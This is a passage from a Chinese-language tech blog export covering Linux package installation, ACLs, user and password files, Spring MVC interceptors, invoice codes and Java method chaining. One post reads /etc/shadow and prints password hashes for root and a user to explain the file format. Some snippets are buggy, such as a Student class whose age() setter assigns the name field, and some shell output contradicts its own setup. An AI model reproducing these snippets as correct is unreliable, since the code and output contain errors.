- Mediabaseurl=file:///mnt/cdrom/ # 光盘挂载点# 只保留一个, 其他注释掉# file:///media/cdrom/# file:///media/cdrecorder/gpgcheck=1enabled=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-5# 3. 查看Yum列表, c5-media 为容器名, 说明本地Yum源设置成功[root@localhost /]# yum list[root@localhost ~]# yum list | grep 'httpd'httpd.x86_64 2.2.3-22.el5.centos c5-mediahttpd-manual.x86_64 2.2.3-22.el5.centos c5-mediasystem-config-httpd.noarch 5:1.3.3.3-1.el5 installed Yum常用命令Yum安装等操作不用再使用包全名, 使用包名即可。123456789101112131415# 1. 安装, -y 自动回答yes[root@localhost ~]# yum -y install httpd# 2. 升级, 注意! 如果未加包名, 会更新所有软件, 包括系统内核![root@localhost ~]# yum -y update httpd# 3. 卸载[root@localhost ~]# yum -y remove httpd# 4. 搜索, 或者使用 yum list | grep 'httpd'[root@localhost ~]# yum search httpdLoaded plugins: fastestmirrorLoading mirror speeds from cached hostfile========================== Matched: httpd =============================mod_ssl.x86_64 : Apache HTTP 服务器的 SSL/TLS 模块system-config-httpd.noarch : Apache 配置工具。httpd.x86_64 : Apache HTTP 服务器httpd-manual.x86_64 : Apache HTTP 服务器的文档。 Yum 软件组软件组, 顾名思义, 就是一组软件。12345678910# 1. 先将系统语言改为英文[root@localhost ~]# LANG=en_US# 2. 列出所有可用的软件组列表[root@localhost ~]# yum grouplist# 3. 安装 MySQL 软件组, 组名必须要英文, 第1步已经修改了系统语言[root@localhost ~]# yum groupinstall "MySQL Server"# 4. 卸载软件组[root@localhost ~]# yum groupremove "MySQL Server"# 5. 将系统语言改为中文UTF8[root@localhost ~]# LANG=zh-CN.utf8]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux软件安装</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux软件安装之源码包详解]]></title>
    <url>%2Fposts%2Fsource_code_installation_of_Linux_software.html</url>
    <content type="text"><![CDATA[前言源代码包则主要适用于自由软件的安装，用户需要自己编译它们。通常从软件的官方网站获取下载。就是开发者写的代码, 需要自己手动编译。 正文以 Apache 的 httpd 包为例。httpd各版本下载地址 1234567891011121314151617181920212223242526# 1. 安装 gcc 编译器, 源码包必须安装编译器[root@localhost /]# yum -y install gcc# 2. 下载 Apache 的 httpd 源码包, -C 断点续传, -o 指定输出文件[root@localhost /]# curl -C -o /opt/httpd-2.2.9.tar.gz http://archive.apache.org/dist/httpd/httpd-2.2.9.tar.gz# 3. 解压缩, 并进去该目录, -z 使用gzip压缩, -x 解压缩, -v 显示操作过程, -f 指定操作的文件, -C 解压在指定目录下[root@localhost /]# tar -zxvf /opt/httpd-2.2.9.tar.gz -C /opt# 4.1. 进入解压缩后的目录, 必须!!![root@localhost /]# cd /opt/httpd-2.2.9# 4.2. 软件配置, 生成Makefile文件, 保存定义好的功能选项和检测系统环境的信息, 用于后续的安装# 安装到 /opt/apache 目录下[root@localhost httpd-2.2.9]# ./configure --prefix=/opt/apache# 4.3. make是用来编译的，它从Makefile中读取指令，然后编译。# 如果报错, 需要执行 make clean 清除缓存和临时文件。[root@localhost httpd-2.2.9]# make# 4.4. make install是用来安装的，它也从Makefile中读取指令，安装到指定的位置。# 如果报错, 需要执行 make clean 清除缓存和临时文件, 并删除/opt/apache目录。[root@localhost httpd-2.2.9]# make install# 5. 编辑html, 启动apache, 关闭防火墙, 在浏览器输入服务器的 ip 地址即可访问[root@localhost httpd-2.2.9]# vim /opt/apache/htdocs/index.html[root@localhost httpd-2.2.9]# /opt/apache/bin/apachectl start[root@localhost httpd-2.2.9]# systemctl stop firewalld.service# 6. 卸载直接删除目录即可[root@localhost httpd-2.2.9]# cd / &amp;&amp; rm -rf /opt/http* /opt/apache]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux软件安装</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringMVC检测异常链接]]></title>
    <url>%2Fposts%2Fdetect_abnormal_url_in_SpringMVC.html</url>
    <content type="text"><![CDATA[前言大型网站通常会因为开发人员的代码功底参差不齐, 在一段时间后, 因为接口关闭等一系列原因, 造成页面出现500或404等常见错误。而这些链接是隐藏极深, 难以去人工一一排除的。 Xenu Link Sleuth是一个错链扫描工具, 可以检测到网页中的链接是否正常。当然, 这个工具是需要自己手动点击才能自动扫描的。最好就是用户访问到的瞬间, 我们就能知道链接是否正常。 拦截器Spring MVC提供了拦截器和拦截器链。推荐使用注解加载Bean。 12345678910111213141516171819202122232425262728293031/** * Created by Ahaochan on 2017/9/21. * Spring拦截器的注解, 复制自&#123;@link org.springframework.stereotype.Service&#125; */@Target(&#123;ElementType.TYPE&#125;)@Retention(RetentionPolicy.RUNTIME)@Documented@Componentpublic @interface Interceptor &#123; String value() default "";&#125;/** * Created by Ahaochan on 2017/9/21. * Web状态码拦截器, 拦截到异常或状态码不为200, 则进行处理 * 写入数据库、日志, 或者短信提醒 */@Interceptorpublic class WebStatusInterceptor extends HandlerInterceptorAdapter &#123; private static final Logger logger = LoggerFactory.getLogger(WebExceptionResolver.class); @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception &#123; // 具体实现交由开发人员自行处理 if(ex != null || response.getStatus() != HttpStatus.OK.value())&#123; logger.error("异常链接:"+request.getRequestURI()); logger.error("状态码:"+response.getStatus()); logger.error("异常:", ex); &#125; &#125;&#125; 123456789101112131415161718192021&lt;!--spring-aop.xml 省略部分代码--&gt;&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans&gt; &lt;!--扫描aop相关的bean --&gt; &lt;context:component-scan base-package="com.ahao" use-default-filters="false"&gt; &lt;!-- 扫描拦截器 --&gt; &lt;context:include-filter type="annotation" expression="com.ahao.annotation.Interceptor"/&gt; &lt;/context:component-scan&gt; &lt;aop:aspectj-autoproxy proxy-target-class="true"/&gt; &lt;!-- 拦截器链 --&gt; &lt;mvc:interceptors&gt; &lt;mvc:interceptor&gt; &lt;!-- 对所有uri进行拦截 --&gt; &lt;mvc:mapping path="/**"/&gt; &lt;!-- 特定请求的拦截器只能有一个 --&gt; &lt;ref bean="webStatusInterceptor "/&gt; &lt;/mvc:interceptor&gt; &lt;/mvc:interceptors&gt;&lt;/beans&gt; 总结Xenu Link Sleuth是比较强大的工具, 但是及时性不足, 扫描时间过长。Spring MVC提供了拦截器可以补充上面的缺陷, 但是缺点就是无法扫描外部链接。]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Spring MVC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux权限管理之ACL权限]]></title>
    <url>%2Fposts%2FACL_permissions_for_Linux_rights_management.html</url>
    <content type="text"><![CDATA[前言ACL权限 Access Control List适用于当一个用户不满足所有者owner, 所属组group, 其他人other的情况。比如一个家庭账本权限为-rwxrwx---, 所有者owner是我, 所属组group是直系亲属, 其他人other是陌生人。现在三姑六婆想阅读这个家庭账本, 要求权限为r--, 不满足拥有者(我), 所属组(直系亲属), 其他人(陌生人), 这时候就是使用ACL权限的时候。 开启ACL权限执行以下shell脚本, 查看是否已经开启了ACL权限。123456789#!/bin/bash[[ $UID != "0" ]] &amp;&amp; echo "you must be root" &amp;&amp; exit 1;filesystem=$(mount | grep " / " | cut -d " " -f 5)if [[ $&#123;filesystem&#125; == "ext3" ]];then /sbin/dumpe2fs -h /dev/sda2 | grep "acl" [[ $? == "0" ]] &amp;&amp; echo "enabled acl" || echo "disabled acl"fi 一般默认开启, 如果没有开启, 进行以下配置即可12345# 1. 临时配置, 重新挂载/根目录, 加入ACL权限[ahao@localhost ~]$ mount -o remount,acl /# 2. 永久配置, 写入/etc/fstab文件, 重启生效[root@localhost ~]# vim /etc/fstab LABEL=/ / ext3 defaults,acl 1 1 查看和设置文件ACL权限设置ACL权限用setfacl -m [u|g]:[用户名|组名]:权限 文件名命令。查看ACL权限用getfacl 文件名 选项 说明 使用 m 设置ACL权限 setfacl -m [u&#124;g]:[用户名&#124;组名]:权限 文件名 x 删除指定ACL权限 setfacl -x [u&#124;g]:[用户名&#124;组名] 文件名 b 删除全部ACL权限 setfacl -b 文件名 d 设定默认ACL权限(子文件继承目录ACL权限) setfacl -m d:[u&#124;g]:[用户名&#124;组名]:权限 文件名 k 删除默认ACL权限(子文件继承目录ACL权限) setfacl -m R 递归设置ACL权限(容易给文件x权限) setfacl -m [u&#124;g]:[用户名&#124;组名]:权限 -R 目录名 这是一个例子。1234567891011121314151617181920212223242526272829303132# 1. 创建权限为drwxrwx---, 用户和用户组为root的dir目录[root@localhost ~]# mkdir ~ahao/dir [root@localhost ~]# chmod 770 ~ahao/dir[root@localhost ~]# ll ~ahao总用量 0drwxrwx---. 2 root root 6 11月 4 22:32 dir# 2. 操作1: ahao用户尝试进入dir目录失败, 权限不足[ahao@localhost ~]$ cd dir-bash: cd: dir: 权限不够# 3. root用户设置ACL权限, 给ahao用户赋予rx权限[root@localhost ~]# setfacl -m u:ahao:rx ~ahao/dir[ahao@localhost ~]$ ll总用量 0drwxrwx---+ 2 root root 6 11月 4 22:32 dir# 4. 操作2: ahao用户尝试进入dir目录成功, dir的+权限位代表ACL权限[ahao@localhost ~]$ cd dir[ahao@localhost dir]$ # 成功进入dir目录 # 5. 操作3: 查看ACL权限[ahao@localhost dir]$ getfacl ~ahao/dir/ getfacl: Removing leading '/' from absolute path names# file: home/ahao/dir/# owner: root# group: rootuser::rwxuser:ahao:r-x # ACL权限group::rwxmask::rwxother::--- mask掩码上面的例子在使用getfacl dir之后, 可以看到有一项是mask。这个和默认权限umask差不多, 也是一个权限掩码, 表示所能赋予的权限最大值。这里的mask和ACL权限进行&amp;与运算, 得到的才是真正的ACL权限。用人话讲, 就是 你考一百分是因为实力只有一百分我考一百分是因为总分只有一百分 mask限制了权限的最高值。12345678910111213141516171819202122232425262728293031323334353637# 1. 修改ACL权限mask为r-x[root@localhost ~]# setfacl -m m:rx ~ahao/tmp/av [root@localhost ~]# getfacl ~ahao/tmp/avgetfacl: Removing leading '/' from absolute path names# file: home/ahao/tmp/av# owner: root# group: rootuser::rwxgroup::r-xmask::r-x # 修改ACL权限mask为r-xother::---# 2. 为用户ahao添加ACL权限rwx[root@localhost ~]# setfacl -m u:ahao:rwx ~ahao/tmp/av/ [root@localhost ~]# getfacl ~ahao/tmp/avgetfacl: Removing leading '/' from absolute path names# file: home/ahao/tmp/av# owner: root# group: rootuser::rwxuser:ahao:rwxgroup::r-xmask::rwx # 注意, 这里的mask掩码会改变, 因为赋予的ACL权限大于maskother::---# 3. 修改ACL权限mask为r-x[root@localhost ~]# setfacl -m m:rx ~ahao/tmp/av[root@localhost ~]# getfacl ~ahao/tmp/avgetfacl: Removing leading '/' from absolute path names# file: home/ahao/tmp/av# owner: root# group: rootuser::rwxuser:ahao:rwx #effective:r-x # 这里会提示真实的ACL权限为r-xgroup::r-xmask::r-x # 这里mask不会再改变other::--- mask 会限制 ACL 权限的最大值。 赋予ACL 权限大于 mask 的时候, 会将 mask 撑大。]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux用户管理之配置文件]]></title>
    <url>%2Fposts%2Fconfiguration_file_of_user_management.html</url>
    <content type="text"><![CDATA[前言Linux 用户管理涉及到几个文件 /etc/passwd 存储用户账号信息 /etc/shadow 存储用户密码信息 /etc/group存储用户组信息 /etc/gshadow存储用户组管理员密码信息 文件结构/etc/passwd文件结构/etc/passwd是存储账号的文件。123[root@localhost ~]# cat /etc/passwd | grep -E "ahao|root"ahao:x:500:500:ahao:/home/ahao:/bin/bashroot:x:0:0:root:/root:/bin/bash 以冒号分割, 分为7个部分。 ahao: 用户名。 x: 以前存储密码的字段, 现在改为/etc/shadow文件。 500: 第一个500是uid用户id。 500: 第二个500是gid群组id, 在/etc/group文件中。 ahao: 这个是用户信息说明栏, 用来解释这个账号的意义。 /home/ahao: 家目录 /bin/bash: 默认使用Bash 用户uid的编码规则 id 范围 该 ID 使用者特性 0 root用户, 系统管理员 1~99 系统id, 由 distributions 自行创建的系统账号, 启动系统服务使用该账号 100~499 系统id, 若用户有系统账号需求时, 可以使用的账号UID, 启动系统服务使用该账号 500~65535 可登陆账号, 一般用户使用 /etc/shadow 文件结构/etc/shadow是存储密码的文件。123[root@localhost ~]# cat /etc/shadow | grep -E "ahao|root"ahao:$1$eoG3CKlq$D8deyAR.qvEws9kA5pFLd1:17431:0:99999:7:::root:$1$zQeO.jbw$ZyXVaa7yPIb2K/3BopdSa.:17431:0:99999:7::: 以冒号分割, 分为8个部分。 ahao: 用户名 $1$eoG3CKlq$D8deyAR.qvEws9kA5pFLd1: 加密后的密码 17431: 最近改密码的日期距离1970年1月1日的天数。 0: 只有0天后密码才能再次修改。 99999: 必须在99999天后修改密码, 否则账号标记为过期。 7: 警告该账号, 还有7天不修改密码的话, 账号就会过期。 null: 在账号标识为过期后, 还有null天宽限期可以登录该账号, 登录后会强制让用户修改密码。 null: 1970年1月1日的null天后账号失效, 和过期不同。 null: 保留字段, 暂时没用。 /etc/group文件结构/etc/group是存储用户组的文件。123[root@localhost ~]# cat /etc/group | grep -E "ahao|root"root:x:0:rootahao:x:500: ahao: 用户组名, 在不指定用户组的情况下，创建用户并指定密码后会默认创建同名用户组。 x: 用户组密码, 改存储到/etc/gshadow文件。 500: 用户组ID, 对应/etc/passwd第四个字段。 null: 用户组支持的账号, 一个账号可以有多个用户组, 比如ahao用户要加入root用户组, 则编辑为root:x:0:root,ahao即可。 /etc/gshadow文件结构/etc/gshadow是存储用户组密码的文件。123[root@localhost ~]# cat /etc/gshadow | grep -E "ahao|root"root:::rootahao:!!:: ahao: 用户组名, 在不指定用户组的情况下，创建用户并指定密码后会默认创建同名用户组。 !!: 用户组密码。!表示没有密码, 即没有用户组管理员。 null: 用户组管理员的账号。 null: 用户组的下属账号 命令操作123456789101112131415161718[root@localhost ~]# useradd user1 # 新增用户user1[root@localhost ~]# passwd user1 # 设置user1的密码, 创建用户后必须设置密码才能登录。 [root@localhost ~]# usermod -L user1 # 锁定user1的用户(仅改 /etc/shadow的密码部分)[root@localhost ~]# usermod -U user1 # 解锁user1的用户(仅改 /etc/shadow的密码部分)[root@localhost ~]# userdel -r user1 # 删除用户, -r连同家目录[root@localhost ~]# groupadd -r oldGroup1 # 新增用户组oldGroup1, -r创建系统用户组, 即GID&lt;500[root@localhost ~]# groupmod -g 201 -n group1 oldGroup1 # 修改用户组oldGroup1的GID为201, 修改组名为group1[root@localhost ~]# gpasswd group1 # 设置用户组group1的群组管理员密码[root@localhost ~]# gpasswd -A user1 group1 # 设置用户user1为用户组group1的管理员[user1@localhost ~]$ gpasswd -a user2 group1 # 群组管理员user1将用户user2加入用户组group1[user1@localhost ~]$ gpasswd -d user2 group1 # 群组管理员user1将用户user2移出用户组group1[root@localhost ~]# gpasswd -M user2 group1 # 用户root将用户user2加入用户组group1[root@localhost ~]# groupdel group1 # 删除用户组group1 不指定其他选项的情况下, useradd和passwd命令默认完成以下步骤, 默认配置文件在/etc/default/useradd中。 /etc/passwd新增一行用户信息, 包括创建UID/GID/家目录等。 /etc/shadow新增一行密码信息。 /etc/group 新增一个和用户名同名的用户组。]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从时空复杂度思考获取子集合问题]]></title>
    <url>%2Fposts%2Fthink_about_the_problem_of_obtaining_sub_collection_from_the_perspective_of_complexity_in_time_and_space.html</url>
    <content type="text"><![CDATA[前言需求: 需要从List根据条件获取子元素集合subList。 有两种方法 时间优先: 添加到新的集合中。 空间优先: 使用Iterator迭代器进行删除。 这里以ArrayList为例。 测试数据现在需要把偶数取出来。12345678public class Main &#123; public static void main(String[] args) &#123; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); for(int i = 0; i &lt; 100; i++)&#123; list.add(i); &#125; &#125;&#125; 时间优先新建一个集合, 遍历参数集合, 将满足条件的数据插入新的集合, 再将新集合插入1234567891011121314151617181920public class Main &#123; public static void main(String[] args) &#123; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; 100; i++) &#123; list.add(i); &#125; System.out.println(even1(list)); &#125; private static List&lt;Integer&gt; even1(List&lt;Integer&gt; list) &#123; // 添加到新的集合 List&lt;Integer&gt; result = new ArrayList&lt;&gt;(list.size()); for (Integer i : list) &#123; if (i % 2 == 0) &#123; result.add(i); &#125; &#125; return result; &#125;&#125; 空间优先直接在已有集合上, 使用迭代器进行删除操作。1234567891011121314151617181920public class Main &#123; public static void main(String[] args) &#123; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; 100; i++) &#123; list.add(i); &#125; System.out.println(even2(list)); &#125; private static List&lt;Integer&gt; even2(List&lt;Integer&gt; list) &#123; // 在已有集合进行删除 for (Iterator&lt;Integer&gt; it = list.iterator(); it.hasNext(); ) &#123; Integer value = it.next(); if (value % 2 != 0) &#123; it.remove(); &#125; &#125; return list; &#125;&#125; 分析如何选择最佳的获取子集合策略，取决于该集合的数据结构。例如 ArrayList 的集合数据结构是数组, 删除、插入的效率是 O(n) , 查找的效率是 O(1)。再综合考虑代码的复杂度, 个人观点, 如果不是空间非常紧张, 还是选时间优先的方案比较好。]]></content>
      <categories>
        <category>Java SE</category>
      </categories>
      <tags>
        <tag>最佳实践</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java常量字符串过长]]></title>
    <url>%2Fposts%2Fconstant_string_is_too_long.html</url>
    <content type="text"><![CDATA[前言在使用 fastjson 从 url 下载 json 解析时候, 出现了语法错误。要排错, 于是将一堆 json 数据复制到 String。结果报编译异常常量字符串过长。 解决方案使用 Eclipse编译器 解决问题。IDEA 2017.1.5 的操作流程:File -&gt; Settings -&gt; Build,Execution,Deployment -&gt; Compiler -&gt; Java Compiler点击 Use Compiler, 选择 Eclipse, 点击确定保存即可。]]></content>
      <categories>
        <category>Java SE</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Chrome Slow network is detected.Fallback font will be used while loading]]></title>
    <url>%2Fposts%2FChrome_Slow_network_is_detected.Fallback_font_will_be_used_while_loading.html</url>
    <content type="text"><![CDATA[前言升级Chrome后, 在F12控制台调试的时候, 经常会出现一堆代码。看起来也不是错误。1Slow network is detected. Fallback font will be used while loading: http://xxxxxxxx.woff 意义从字面意思上理解。1检测到缓慢的网络请求。当加载http://xxxxxxx.woff时，回调字体将会被使用。 就是当网络字体没加载完毕的时候, 页面会出现空白界面, 这对用户体验很不友好。Chrome正在用本地字体替换网页字体(使用Css的@ font-face规则加载）。 这是一个叫做@font-face的CSS @规则, 它允许网页开发者为其网页指定在线字体, 避免对本地字库的依赖。 简单的说, 这是一个Chrome的bug, 只要加载网络字体, 就会提示这个信息。但是这个信息对Web调试来说是噪音信息, 无用的信息。 解决方案关闭这个提示。眼不见心不烦。在地址栏输入chrome://flags/#enable-webfonts-intervention-v2, 选择Disable即可。目前版本 61.0.3163.100, 尚未修复这个bug。 参考资料 why-does-this-slow-network-detected-log-appear-in-chrome]]></content>
      <categories>
        <category>编程杂谈</category>
      </categories>
      <tags>
        <tag>Chrome</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux以不同方式执行Shell导致的变量生命周期问题]]></title>
    <url>%2Fposts%2FLinux_performs_variable_life_cycle_issues_caused_by_the_shell_in_different_ways.html</url>
    <content type="text"><![CDATA[前言在Tomcat/bin/catalina.sh中有一段代码如下123456# 判断setenv.sh是否存在, 存在就执行if [ -r "$CATALINA_BASE/bin/setenv.sh" ]; then . "$CATALINA_BASE/bin/setenv.sh" # 以点、空格、Shell的方式执行Shellelif [ -r "$CATALINA_HOME/bin/setenv.sh" ]; then . "$CATALINA_HOME/bin/setenv.sh"fi 不同的执行shell方式先添加一个setenv.sh文件12export JAVA_HOME=/opt/jdk/jdk1.8.0_151export JAVA_OPTS=-Xmx512m 执行以下代码1234567891011121314151617181920212223# 查找当前shell中的JAVA变量, 没找到[root@127.0.0.1 ~]# set | grep JAVA# 1.1. 以开启子shell的方式执行setenv.sh[root@127.0.0.1 ~]# sh /opt/tomcat/tomcat-test/bin/setenv.sh # 1.2. setenv.sh的变量生命周期在子shell中, 不影响当前shell, 所以没找到JAVA变量[root@127.0.0.1 ~]# set | grep JAVA# 2.1. 在当前shell执行的方式, 点+空格+shell的格式执行[root@127.0.0.1 ~]# . /opt/tomcat/tomcat-test/bin/setenv.sh # 2.2. 变量生命周期在当前shell, 找到了JAVA变量[root@127.0.0.1 ~]# set | grep JAVAJAVA_HOME=/opt/jdk/jdk1.8.0_151JAVA_OPTS=-Xmx512m# 3.1. 退出shell重新打开shell, 清除之前的变量[root@127.0.0.1 ~]# exit[ahao@127.0.0.1 ~]$ su -# 3.2. 确认JAVA变量已经清除[root@127.0.0.1 ~]# set | grep JAVA# 3.3. 使用source在当前shell执行, 和方式2等价[root@127.0.0.1 ~]# source /opt/tomcat/tomcat-test/bin/setenv.sh # 3.4. 变量生命周期在当前shell, 找到了JAVA变量[root@127.0.0.1 ~]# set | grep JAVAJAVA_HOME=/opt/jdk/jdk1.8.0_151JAVA_OPTS='-Xms2000m -Xmx2000m' 总结 有三种执行shell脚本的语法, 实际上只有两种执行shell的方式, 一种在当前shell执行, 一种在子shell中执行。 . /opt/tomcat/tomcat-test/bin/setenv.sh和source /opt/tomcat/tomcat-test/bin/setenv.sh等价。]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[发票代码和发票号码的意义]]></title>
    <url>%2Fposts%2FThe_meaning_of_invoice_code_and_invoice_number.html</url>
    <content type="text"><![CDATA[前言前段时间要做毕业设计, 需要了解发票的相关知识。这里简单介绍下发票代码和发票号码有什么不同。 正文最主要的还是发票代码, 发票号码是一个8位的流水号。发票代码和发票号码组合起来, 能够确保这张发票在全国的唯一性。 增值税发票增值税发票分为增值税普通发票和增值税专用发票。两者都是10位的阿拉伯数字。 代码序号12345678910代码XXXXXXXXXX说明市级行政区划代码4位制版年度2位批次1位语言文字1位几联发票1位金额版本号1位 行政区划代码有4位, 后面补两个零, 参考【从发票信息中获取位置信息】 制版年度, 代表是几几年印刷的 批次, 代表是几几年印刷第几批印刷的 语言文字, 1中文、 2中英文、 3藏汉文、 4维汉文。 几联发票, 4代表四联发票、 7代表七联发票。 金额版本号, 1万元版、 2十万元版、 3百万元版、 4千万元版、 用0表示电脑发票。 普通发票普通发票代码共12位阿拉伯数字。 代码序号123456789101112代码XXXXXXXXXXXX说明税务局代码1位市级行政区划代码4位制版年度2位统一的行业代码1位细化的发票种类代码4位 税务局代码, 1为国家税务局、 2为地方税务局、 0为总局。 行政区划代码有4位, 后面补两个零, 参考【从发票信息中获取位置信息】 制版年度, 代表是几几年印刷的 统一的行业代码,国税行业划分：1工业、2商业、3加工修理修配业、4收购业、5水电业、6其他。地税行业划分：1交通运输业、2建筑业、3金融保险业、4邮电通信业、5文化体育业、6娱乐业、7服务业、8转让无形资产、9销售不动产、0表示其他。 细化的发票种类代码4位, 由各税务局自行编制。 参考资料 国家税务总局关于统一全国普通发票分类代码和发票号码的通知]]></content>
      <categories>
        <category>金融</category>
      </categories>
      <tags>
        <tag>发票</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从发票信息中获取位置信息]]></title>
    <url>%2Fposts%2FGet_location_from_invoice_information.html</url>
    <content type="text"><![CDATA[前言前段时间要做毕业设计, 需要了解发票的相关知识。需要做地理位置分析, 画个地图。其中, 统一社会信用代码可以获取购销单位的行政区划代码。 发票代码可以获取发票所属地的行政区划代码。 计算方法查阅资料都写的很清楚, 这里再说简单点。获取行政区划代码可以参考我写的一个油猴脚本。 统一社会信用代码1在【统一社会信用代码的校验码验证】一文中有提到, 统一社会信用代码是纳税人的唯一标识。而18位的统一社会信用代码中, 第3-8位就是行政区划代码。比如91350100M000100Y43的行政区划代码为350100, 为福建省福州市。 发票代码注意, 发票代码和发票号码是两回事。 增值税发票共10位, 第1-4位为市级行政区划代码, 后两位补0即可。比如3100164320的行政区划代码为3100, 补零为310000, 为上海市。 普通发票共12位, 第2-5位为市级行政区划代码, 后两位补0即可。比如144031601133的行政区划代码为4403, 补零为440300, 为广东省深圳市。]]></content>
      <categories>
        <category>金融</category>
      </categories>
      <tags>
        <tag>发票</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo多图并排显示]]></title>
    <url>%2Fposts%2FHexo_multiple_images_side_by_side.html</url>
    <content type="text"><![CDATA[前言Hexo有时候需要进行多图并排显示对比。fancybox默认一张图占据一行。需要自己修改Css样式。本文默认使用七牛云插件。 .fancybox { display: inline-block; } 插入Css样式在&lt;!-- more --&gt;之后插入样式, 避免将样式写入description。注意, 因为渲染问题, 请尽量使用回车隔离以下代码块。123456789&lt;style type="text/css"&gt; .fancybox &#123; display: inline-block; &#125;&lt;/style&gt;&#123;% qnimg 最短路径_01.png extend:?imageView2/2/w/200 %&#125;&#123;% qnimg 最短路径_02.png extend:?imageView2/2/w/200 %&#125;]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[统一社会信用代码的校验码验证]]></title>
    <url>%2Fposts%2FThe_validation_of_the_unified_social_credit_identifier.html</url>
    <content type="text"><![CDATA[前言前段时间要做毕业设计, 需要了解发票的相关知识。而购销单位必须要有统一社会信用代码。在中国企业登记网上有详细的介绍。 介绍统一社会信用代码由18位数字或大写字母组成。详细的介绍在中国企业登记网中。 代码序号123456789101112131415161718代码XXXXXXXXXXXXXXXXXX说明登记管理部门代码1位机构类别代码1位登记关机机关行政区划码6位主题标识码(组织机构代码9位)校验码1位 校验码计算下面是js的计算代码。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051function (value)&#123; // value = 91350100M000100Y43; // value = 12440200455904030C; // 判断字符串长度是否为18 if (!$.isString(value) || value.length !== 18) &#123; return false; &#125; // 转化为大写字母 value = value.toUpperCase(); var valid = false; var array = []; var dist = &#123; // 基础值 '0': 0, '1': 1, '2': 2, '3': 3, '4': 4, '5': 5, '6': 6, '7': 7, '8': 8, '9': 9, 'A': 10, 'B': 11, 'C': 12, 'D': 13, 'E': 14, 'F': 15, 'G': 16, 'H': 17, 'J': 18, 'K': 19, 'L': 20, 'M': 21, 'N': 22, 'P': 23, 'Q': 24, 'R': 25, 'T': 26, 'U': 27, 'W': 28, 'X': 29, 'Y': 30, // 权值对应字母 '10': 'A', '11': 'B', '12': 'C', '13': 'D', '14': 'E', '15': 'F', '16': 'G', '17': 'H', '18': 'J', '19': 'K', '20': 'L', '21': 'M', '22': 'N', '23': 'P', '24': 'Q', '25': 'R', '26': 'T', '27': 'U', '28': 'W', '29': 'X', '30': 'Y' &#125;; // 17位权值 var power = [1, 3, 9, 27, 19, 26, 16, 17, 20, 29, 25, 13, 8, 24, 10, 30, 28]; // 1. 获取前17位的基础值 for (var i = 0, len = value.length - 1; i &lt; len; i++) &#123; var num = dist[value[i]]; if (num === undefined) &#123; return false; &#125; array.push(num); &#125; // 2. 获取前17位的权值的和 var sum = 0; for (var i = 0, len = array.length; i &lt; len; i++) &#123; sum += array[i] * power[i]; &#125; // 3. 将(31-权值和)%31的值转化为字母, 和第18位进行比较 if (dist[31 - sum % 31] + '' === value.charAt(value.length - 1)) &#123; valid = true; &#125; return valid;&#125;]]></content>
      <categories>
        <category>金融</category>
      </categories>
      <tags>
        <tag>金融</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VMware虚拟机的网络连接方式]]></title>
    <url>%2Fposts%2FVMware_virtual_machine_network_connection.html</url>
    <content type="text"><![CDATA[前言安装VMware后, 可以在网络适配器看到两个虚拟网卡VMnet1和VMnet8。 连接方式打开网络与共享中心, 点击左侧更改适配器设置, 右键VMnet1或VMnet8, 选择属性。确保两个网卡都开启VMware Bridge Protocal协议。 打开VMware, 点击菜单栏编辑, 选择虚拟网络编辑器, 可以看到三种配置。 桥接模式使用真实网卡连接, 选择可以上网的一块网卡。推荐指定具体网卡, 不选择自动。 只要和真实机相同网段即可通信。需要占用真实网段的ip地址。 NAT连接模式使用VMnet8虚拟网卡连接。只能和真实机通信, 不能连接局域网其他设备。可以访问互联网。 Host-only连接方式使用VMnet1虚拟网卡连接。只能和真实机通信, 不能连接局域网其他设备。只能连接真实机。]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>VMware</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[什么是链式调用]]></title>
    <url>%2Fposts%2Fwhat_is_Methods_Chaining_in_Java.html</url>
    <content type="text"><![CDATA[前言Java8流行的函数式编程使用的方式类似于a.b().c().d(), 仿佛能无穷无尽点下去。其实这个代码很简单, 换一种写法大概就懂了this.getClass().getSimpleName().length();。在wiki上也有介绍: Fluent_interface 实现其实链式调用很简单, 就是一个return 对象;的事情。比如return this;等。123456789101112131415161718192021public class Student&#123; private String name; private int age; public static create()&#123; return new Student(); &#125; public void setName(String name)&#123; this.name = name; // 普通的设置属性 &#125; public void setAge(int age)&#123; this.age = age; // 普通的设置属性 &#125; public Student name(String name)&#123; this.name = name; // 链式的设置属性 return this; &#125; public Student age(int age)&#123; this.name = name; // 链式的设置属性 return this; &#125;&#125; 调用结果如下123456789public class Main&#123; public static void main(String[] args)&#123; Student s1 = new Student(); s1.setName("stu1"); s1.setAge(12); // 